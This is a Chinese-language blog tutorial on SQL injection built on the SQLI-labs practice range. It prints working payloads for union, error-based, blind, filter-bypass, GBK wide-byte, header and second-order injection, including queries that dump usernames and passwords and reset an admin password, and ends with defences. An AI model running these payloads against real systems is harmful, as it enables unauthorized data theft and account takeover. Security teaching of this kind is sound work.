
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/aaronlinv/p/18739993" title="发布于 2025-02-27 08:44">
    <span role="heading" aria-level="2">永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性</p>
<p>以下实验均以 <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener nofollow">SQLI labs</a> 靶场为例</p>
<hr>
<h3 id="1-联合注入union-based">1. 联合注入（Union-Based）</h3>
<p>来自：<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-1" target="_blank" rel="noopener nofollow">Less-1</a></p>
<p><img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225822011-1416488169.png" alt="" loading="lazy"></p>
<p>这是一个常见的查询页面。<code>http://127.0.0.1/Less-1/?id=1</code> ，通过 <code>id=1</code> 传递参数。后端常见的 SQL 写法：<code>SELECT * FROM users WHERE id='$id' LIMIT 0,1;</code></p>
<p>攻击者可以通过构造 <code>id</code> 的参数值，执行任意的 SQL 语句：</p>
<p><img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225825895-1645686708.png" alt="" loading="lazy"></p>
<p>其中关键步骤是构造 <code>1' --+</code>：</p>
<ol>
<li>通过某个具体参数 <code>1</code> 和 单引号 <code>'</code> 来结束前面的语句：<code>SELECT * FROM users WHERE id='</code>，使其成为合法的 SQL 语句： <code>SELECT * FROM users WHERE id='1'</code></li>
<li>通过 <code>--+</code> 来注释后面的 <code>' LIMIT 0,1";</code></li>
</ol>
<p>基于上面的原理，我们就可以在 <code>1'</code> 和 <code>--+</code> 之间插入语句了，进行联合注入，具体步骤如下：</p>
<ol>
<li>
<p>通过 <code>order by</code> 测列宽：<code>?id=-1' order by 4 --+</code>，通过不断尝试和错误提示可以得知列宽为 3<br>
<img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225837856-110228501.png" alt="" loading="lazy"></p>
</li>
<li>
<p>判断回显值对应的位置，<code>?id=-1' union select 1,2,3 --+</code>，2 和 3 这两个位置都可供使用<br>
<img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225843404-1936349494.png" alt="" loading="lazy"></p>
</li>
<li>
<p>在某个可回显的位置执行 select 语句：<code>?id=-1' union select 1,2, database() --+</code><br>
<img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225852369-1492368197.png" alt="" loading="lazy"></p>
</li>
</ol>
<p>你可以能会想，这又啥用呢？但实际上在没有<strong>严格权限管理</strong>的数据库上，我们可以通过构造下面语句获得所有库表的信息</p>
<pre><code class="language-sql">--+ 1. 查库：查询所有数据库的名称
SELECT schema_name FROM information_schema.schemata
--+ 2. 查表：查询指定数据库中的所有表
SELECT table_name FROM information_schema.tables WHERE table_schema='security'
--+ 3. 查列：查询表中的所有列
SELECT column_name FROM information_schema.columns WHERE table_name='users'
--+ 4. 查字段：获取用户表中的敏感数据，如用户名和密码
SELECT username, password FROM security.users
</code></pre>
<p>举个例子：我们可以通过构造语句，获取所有的账户和密码，将其通过 <code>~</code> 进行分隔：<code>?id=-1'  union select 1,2, group_concat(concat_ws('~',username,password)) from security.users  --+</code></p>
<p><img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225858635-1710734511.png" alt="" loading="lazy"></p>
<hr>
<h3 id="2-报错注入error-based">2. 报错注入（Error-Based）</h3>
<p>来自：<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-5" target="_blank" rel="noopener nofollow">Less-5</a></p>
<p>不是所有场景都会回显数据库值，那是否就安全了？攻击者可以通过显示的错误来获取数据库值</p>
<pre><code class="language-sql">--+ 0x7e 为 16 进制编码的 ~
SELECT updatexml(1, concat(0x7e, database()), 1) FROM DUAL;
</code></pre>
<p>通过函数构造错误，将期望的信息以错误的信息提示出来：<code>?id=1' and updatexml(1,concat(0x7e,(database())),1) --+</code></p>
<p><img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225910450-1098693124.png" alt="" loading="lazy"></p>
<pre><code class="language-sql">XPATH syntax error: '~security'
</code></pre>
<p>通过上面的错误我们就知道当前库名为：<code>security</code>，类似地可以执行任意语句</p>
<hr>
<h3 id="3-布尔盲注boolean-based-blind">3. 布尔盲注（Boolean-Based Blind）</h3>
<p>来自：<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-7" target="_blank" rel="noopener nofollow">Less-7</a></p>
<p>一般项目都会隐藏错误堆栈，只提示成功或者失败，可以使用布尔盲注：<code>?id=1')) and left((select database()),1)='s'--+</code></p>
<ol>
<li>通过 order by 测列宽 <code>?id=1')) order by 4 --+</code></li>
<li>通过 left 函数，逐个字符地遍历判断 <code>?id=1')) and left((select database()),1)='s'--+ </code>，当前库名首字母为 <code>s</code> 时会提示正确，否则提示错误</li>
</ol>
<p>tips：这里使用的是 <code>?id=1'))</code> 有别于前文的 <code>1'</code>，这是因为不同 SQL 语句可能对变量采用不同的闭合方式，注入时要符合原 SQL 语句，否则会出现 SQL 语法错误</p>
<p>通过类似的原理我们可以按照行列顺序依次遍历：</p>
<pre><code class="language-sql">--+ 0x7365637572697479 为 16 进制编码的 security，使用 16 进制编码可以避免使用单引号

?id=1')) and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1--+
</code></pre>
<p>再配合二分法提高效率，最终也能得到所有库表信息</p>
<h3 id="4-时间盲注time-based-blind">4. 时间盲注（Time-Based Blind）</h3>
<p>来自：<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-9" target="_blank" rel="noopener nofollow">Less-9</a></p>
<p>如果没给出提示，或者无论正确与否都给出相同提示，那该怎么办呢？可以使用时间盲注</p>
<p>在语句中调用 <code>sleep()</code> 函数，通过网页响应速度来判断是否为我们预期的结果</p>
<p>构造 <code>?id=10' and sleep(5) --+</code> 来判断当前接口是否支持时间盲注，遍历过程与布尔盲注类似，增加了 if 函数，结果符合预期返回 1，否则执行 sleep(5)</p>
<pre><code class="language-sql">?id=1' and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;1112,1,sleep(5))--+ 
</code></pre>
<hr>
<h3 id="5-绕过过滤bypass">5. 绕过过滤（Bypass）</h3>
<p>来自：<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-25" target="_blank" rel="noopener nofollow">Less-25</a></p>
<p>既然可以通过盲注来执行任意指令，那就直接加强参数的检查， 替换（或过滤）所有的 or 和 and</p>
<p>攻击者可以通过双写的方式绕过：<code>oorr</code> → 被过滤后变为 <code>or</code>，也可以通过 <code>||</code> 替代 <code>OR</code>，<code>&amp;&amp;</code> 替代 <code>AND</code></p>
<pre><code class="language-sql">--+ ;%00 等效于 --+ 。%00是 URL 编码表示的空字符（NUL 字符），其 ASCII 值为 0

?id=10' oorrder by 2;%00
</code></pre>
<hr>
<h3 id="6-宽字节注入gbk-bypass">6. 宽字节注入（GBK Bypass）</h3>
<p>来自：<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-32" target="_blank" rel="noopener nofollow">Less-32</a></p>
<p>既然替换保留字符也能被绕过，那就将参数中的单引号进行转义：<code>'</code> 转义为 <code>\'</code></p>
<p>攻击者可以通过宽字节注入的方式使得转义符号失效，构造请求<code>?id=1%df' order by 4 --+</code></p>
<p>单引号 为 <code>%27</code>，而 <code>\</code> 为 <code>%5c</code>。PHP 后端在接受到参数时发现有单引号，就自动在其前面加上<code>\</code>，变成 <code>\'</code>，即 <code>%5c%27</code></p>
<p>我们在其前面加上 <code>%df</code>，构造出 <code>%df\'</code>，即 <code>%df%5c%27</code></p>
<p>数据库使用 GBK 编码时 <code>%df%5c</code> 会被解码为 <code>運</code>，<code>\</code> 被“吃掉了”，单引号被保留，故可以执行我们期望的 SQL。类似的方法还有将 UTF-8 转换为 UTF-16 或 UTF-32，将 ' 转为 UTF-16</p>
<hr>
<h3 id="7-header-注入http-header-injection">7. Header 注入（HTTP Header Injection）</h3>
<p>来自：<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-18" target="_blank" rel="noopener nofollow">Less-18</a></p>
<p>假设我严格地检查所有参数，那是否就安全了呢？</p>
<p>攻击者可以在插入请求头信息时进行攻击，下面为常见的登陆信息收集，<code>uagent</code> 来自用户的请求头 <code>User-Agent</code></p>
<pre><code>$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
</code></pre>
<p>在访问页面时构造 HTTP Header：<code>User-Agent: 'and&nbsp;updatexml(1,concat(0x7e,(database()),0x7e),1) and '1'= '1</code>，配合报错注入获得库表信息。类似的攻击还可以使用 <code>Referer</code> 和 <code>Cookie</code> 等等</p>
<hr>
<h3 id="8-二次注入second-order">8. 二次注入（Second-Order）</h3>
<p>来自：<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-24" target="_blank" rel="noopener nofollow">Less-24</a></p>
<p>假设我们对所有参数和 HTTP Header 都严格检查，肯定就安全了吧？攻击者还可以通过二次注入的方式绕过你的检查</p>
<p>这是一个经典的用户登陆页面，包含创建用户，登陆后可以修改用户密码</p>
<p><img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225917520-2104357506.png" alt="" loading="lazy"></p>
<p>修改密码的 SQL 如下：</p>
<pre><code class="language-sql">UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
</code></pre>
<p>攻击者可以通过构建用户 <code>admin'#</code></p>
<p><img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225930541-120875861.png" alt="" loading="lazy"></p>
<p>登陆该用户修改密码，实现间接修改掉 <code>admin</code> 超级用户的密码：</p>
<p><img src="https://img2024.cnblogs.com/blog/1929786/202502/1929786-20250226225937397-380861097.png" alt="" loading="lazy"></p>
<pre><code class="language-sql">UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass'

--+ 移除注释，等价于
UPDATE users SET PASSWORD='$pass' where username='admin'
</code></pre>
<hr>
<h3 id="结尾">结尾</h3>
<p>我们可能觉得现代框架和工具链可以避免这些问题，但通过上面的例子可以感受到，道高一尺魔高一丈，<strong>稍有疏忽就可能被利用</strong></p>
<p>SQL注入的本质是：攻击者通过操控用户输入的方式，改变原本的SQL查询结构，从而绕过应用程序的安全策略，执行恶意指令。我们可以从不同的角度进行防御：</p>
<ul>
<li>校验用户输入</li>
<li>操作前进行详尽的校验包括已入库的数据</li>
<li>细化数据库账户权限</li>
<li>结合 WAF、日志监控、定期渗透测试</li>
<li>...</li>
</ul>
<p>SQL注入攻击揭示的不仅是技术漏洞，更指向一个通用安全原则：<strong>任何外部输入都可能在与现有流程交互时引发非预期行为</strong>。这一安全思维可迁移至日常生活风险防控体系：</p>
<ul>
<li>查杀未知邮件的附件</li>
<li>逐一检查合同</li>
<li>对陌生通知通过官方渠道二次确认</li>
<li>仔细评审合作方提供的材料</li>
<li>...</li>
</ul>
<h3 id="参考资料">参考资料</h3>
<p>本文只为抛砖引玉，精简了部分细节，详情可以参考以下教程：</p>
<ul>
<li><a href="https://www.sqlsec.com/2020/05/sqlilabs.html" target="_blank" rel="noopener nofollow">SQLI labs 靶场精简学习记录</a></li>
<li><a href="https://github.com/crow821/crowsec/blob/master/sqli-labs%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/sqli-labs%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B20200124.pptx" target="_blank" rel="noopener nofollow">sqli-labs基础教程/sqli-labs注入教程20200124.pptx</a></li>
<li><a href="https://www.bilibili.com/video/BV1e441127Rd" target="_blank" rel="noopener nofollow">sql注入之sqli-labs系列教程(less1-10)</a></li>
<li><a href="https://www.cnblogs.com/1ink/p/15115790.html" target="_blank">sqli-labs(62-65)-challenges-盲注</a></li>
<li><a href="https://ovi3.github.io/2020/12/04/sqli-labs-less-62/" target="_blank" rel="noopener nofollow">sqli-labs靶场Less-62题解（少于130次）</a></li>
</ul>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.013896261873842592" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-02-27 08:44">2025-02-27 08:44</span>&nbsp;
<a href="https://www.cnblogs.com/aaronlinv">AaronLin</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18739993" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18739993);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18739993', targetLink: 'https://www.cnblogs.com/aaronlinv/p/18739993', title: '永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性' })">举报</a>
</div>
        